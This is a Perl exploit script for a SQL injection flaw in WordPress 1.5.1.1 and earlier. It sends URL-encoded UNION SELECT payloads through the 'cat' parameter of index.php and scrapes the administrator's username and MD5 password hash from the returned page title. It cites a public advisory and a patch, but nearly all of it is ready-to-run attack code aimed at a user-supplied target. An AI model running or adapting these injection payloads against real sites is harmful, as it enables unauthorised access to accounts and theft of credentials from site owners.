#!/usr/bin/perl -w
#
# SQL Injection Exploit for WordPress <= 1.5.1.1
# This exploit show the username of the administrator of the blog and his
password crypted in MD5
# Related advisory:
http://www.securityfocus.com/archive/1/401597/30/0/threaded
# Patch: Download the last version at http://wordpress.org/download/
# Coded by Alberto Trivero

use LWP::Simple;

print "\n\t======================================\n";
print "\t=  Exploit for WordPress <= 1.5.1.1  =\n";
print "\t=   Alberto Trivero - codebug.org    =\n";
print "\t======================================\n\n";

if(!$ARGV[0] or !($ARGV[0]=~m/http/)) {
   print "Usage:\nperl $0 [full_target_path]\n\n";
   print "Examples:\nperl $0 http://www.example.com/wordpress/\n";
   exit(0);
}

$page=get($ARGV[0]."index.php?cat=%2527%20UNION%20SELECT%20user_login%20FROM
%20wp_users/*") || die "[-] Unable to retrieve: $!";
print "[+] Connected to: $ARGV[0]\n";
$page=~m/<title>.*?&raquo; (.*?)<\/title>/ && print "[+] Username of
administrator is: $1\n";
print "[-] Unable to retrieve username\n" if(!$1);
$page=get($ARGV[0]."index.php?cat=%2527%20UNION%20SELECT%20user_pass%20FROM%
20wp_users/*") || die "[-] Unable to retrieve: $!";
$page=~m/<title>.*?&raquo; (.*?)<\/title>/ && print "[+] MD5 hash of
password is: $1\n";
print "[-] Unable to retrieve hash of password\n" if(!$1);
